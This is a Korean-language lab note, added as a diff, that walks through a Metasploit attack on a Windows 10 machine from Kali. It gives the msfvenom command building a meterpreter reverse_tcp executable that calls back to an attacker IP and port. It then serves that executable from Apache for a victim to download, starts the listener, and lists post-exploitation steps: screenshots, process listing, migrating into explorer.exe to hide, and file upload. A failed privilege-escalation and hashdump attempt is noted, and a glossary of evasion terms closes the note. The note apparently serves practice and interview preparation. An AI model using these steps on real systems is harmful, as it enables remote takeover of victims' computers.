@@ -1,0 +1,51 @@
+기초단계
+1. 독 제조
+msfvenom -p windows/meterpreter/reverse_tcp LhOST=172.16.29.200 LPORT=4444 -f exe -o ul.exe
+2. 웹페이지에 접속하면 파일 다운되게 만듦(ul.exe.파일을 아파치 위치에 두기)
+cp ul.exe /var/www/html/
+3. msfconsole로 접속 후 핸들러 사용 명령
+use exploit/multi/handler
+4. 공격 실행
+set LHOST 172.16.29.200 (공격자 ip)
+set LPORT 4444
+set payload windows/meterpreter/reverse_tcp (페이로드 종류)
+exploit -j -z (공격 옵션 j=백그라운드 z=연결이 되어도 일단 대기)
+5. 켜주자마자 피해자 pc에서 ul.exe. 실행!
+6. sessions로 확인
+
+1. 독 제조 (Payload 생성) msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.29.200 LPORT=4444 -f exe -o ul.exe
+2. 파일 배포 준비 (아파치 웹 서버 활용) cp ul.exe /var/www/html/ (피해자가 웹페이지 접속 시 다운로드 가능하게 설정)
+3. msfconsole 접속 및 핸들러 호출 use exploit/multi/handler
+4. 리스너(Listener) 설정 및 공격 실행 set LHOST 172.16.29.200 (공격자 IP 설정) set LPORT 4444 (공격자 포트 설정) set payload windows/meterpreter/reverse_tcp (생성한 독과 동일한 페이로드 설정) exploit -j -z (핸들러를 백그라운드에서 대기 상태로 실행)
+5. 타겟 실행 유도 피해자 PC에서 웹 서버에 접속하여 ul.exe 다운로드 및 실행
+6. 연결 확인 sessions -l (생성된 세션 목록 확인 및 진입 준비)
+
+모의 침투 실습 및 보안 분석 보고서
+실습 개요
+실습 도구: Metasploit Framework (msfvenom, msfconsole)
+실습 환경: Windows 10 (Target), Kali Linux (Attacker)
+실습 목적: 침투 세션 확보 후 권한 상승 시도 및 프로세스 은닉 기술 실습
+주요 실습 단계 및 명령어
+세션 확인: sessions -l (현재 연결된 타겟 PC 목록 확인)
+세션 진입: sessions -i 1 (확보된 1번 세션으로 제어 시작)
+정보 수집: screenshot (타겟 PC의 현재 화면 캡처 및 이미지 저장)
+프로세스 확인: ps (타겟에서 실행 중인 프로세스 이름과 PID 확인)
+프로세스 은닉: migrate [PID] (정상 프로세스로 코드를 주입하여 은닉)
+파일 전송: upload [파일명] [경로] (타겟 PC로 분석용 파일 업로드)
+기술적 분석 및 주요 이슈
+getsystem 및 hashdump 실패 분석: 최신 Windows 10의 UAC(사용자 계정 컨트롤) 보안 정책으로 인해 일반 사용자 권한에서는 관리자 권한 승격 및 SAM 파일 접근이 차단됨을 확인. 이를 통해 단순 침투보다 권한 상승 단계의 보안 관문이 더 강력함을 파악.
+
+프로세스 마이그레이션(Migration) 수행: 초기 실행 파일인 ul.exe는 사용자에게 노출되기 쉬우나, 윈도우 기본 프로세스인 explorer.exe(PID: 3676)로 세션을 이동시킴으로써 실행 프로세스를 은닉하고 세션의 지속성을 확보.
+
+기술 답변 (면접/발표용) 질문: msfvenom을 사용해 본 적이 있나요? 답변: 페이로드를 생성하고 침투 이후의 탐지 회피와 권한 관리 메커니즘을 학습했습니다. 실습 중 msfvenom으로 확보한 초기 세션이 윈도우의 UAC에 의해 권한이 제한되는 것을 확인하였고,
+이를 해결하기 위해 프로세스 마이그레이션 기능을 활용하여 explorer.exe와 같은 정상 프로세스 메모리 영역에 코드를 주입하고, 탐지율을 낮추면서 세션 안정성을 확보하는 포스트 익스플로잇 과정을 성공적으로 수행하였습니다.<<
+
+핵심 기술 용어 정리
+
+Payload Injection: 정상적인 프로세스의 메모리 공간에 코드를 삽입하여 실행하는 기술
+
+Living off the Land (LotL): 타겟 시스템에 이미 설치된 정상 도구를 악용하여 흔적을 최소화하는 방식
+
+Evasion Technique: 백신의 시그니처 및 행위 기반 탐지를 피하기 위한 모든 기술적 시도
+
+SAM (Security Account Manager): 윈도우 계정 정보 및 비밀번호 해시가 저장된 데이터베이스
